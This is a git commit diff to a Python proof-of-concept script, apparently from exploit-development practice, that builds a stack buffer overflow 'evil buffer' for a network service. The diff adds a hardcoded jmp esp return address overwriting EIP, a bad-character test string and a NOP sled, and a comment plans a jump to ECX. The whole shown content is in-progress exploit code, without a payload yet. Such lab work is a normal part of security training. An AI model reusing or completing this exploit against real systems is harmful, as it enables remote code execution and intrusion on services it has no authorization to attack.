a274a5e898c3e980224ed0c0889adac540442767
kali <jarrettw@protonmail.com>
2020-04-08 16:59:08 -0400

    Bad chars progress

--- vuln/Vuln2_poc.py
+++ vuln/Vuln2_poc.py
@@ -3,10 +3,19 @@ import socket
 
 print "\nSending evil buffer..."
 buffer = "A" * 2080
-eip = "B" * 4
-offset = "C" * (2096 - (len(buffer) - len(eip)))
 
-input_buffer = buffer + eip + offset
+# jmp esp
+# 1480113D
+eip = "\x3d\x11\x80\x14"
+
+# offset = "C" * (2096 - (len(buffer) - len(eip))) # len 20
+badchars = "\x01\x02\x03\x04\x05\x06\07\x08\x09\x0b\x0c\x0e\x0f\x10"
+# print len(badchars) # 14
+nops = "\x90" * 6
+# print len(nops)
+
+input_buffer = buffer + eip + badchars + nops
+# now that I have control of esp, try to jmp ecx
 
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
 
